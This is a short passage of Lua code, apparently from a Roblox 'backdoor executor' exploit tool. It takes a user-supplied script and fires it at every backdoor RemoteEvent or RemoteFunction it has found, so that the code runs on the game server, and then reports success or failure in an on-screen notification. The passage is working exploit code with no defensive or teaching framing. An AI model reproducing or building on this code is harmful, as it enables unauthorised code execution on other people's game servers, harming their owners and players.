    if script == "" then return end
    if #backdoors == 0 then
        game:GetService("StarterGui"):SetCore("SendNotification", { Title = "❌ Error", Text = "No backdoor found", Duration = 2 })
        return
    end
    local success = false
    for _, bd in ipairs(backdoors) do
        pcall(function()
            if bd:IsA("RemoteEvent") then
                bd:FireServer(script)
                success = true
            elseif bd:IsA("RemoteFunction") then
                bd:InvokeServer(script)
                success = true
            end
        end)
    end
    if success then
        game:GetService("StarterGui"):SetCore("SendNotification", { Title = "✅ Server", Text = "Script executed!", Duration = 2 })
    else
        game:GetService("StarterGui"):SetCore("SendNotification", { Title = "❌ Server", Text = "Execution failed", Duration = 2 })
    end
end)

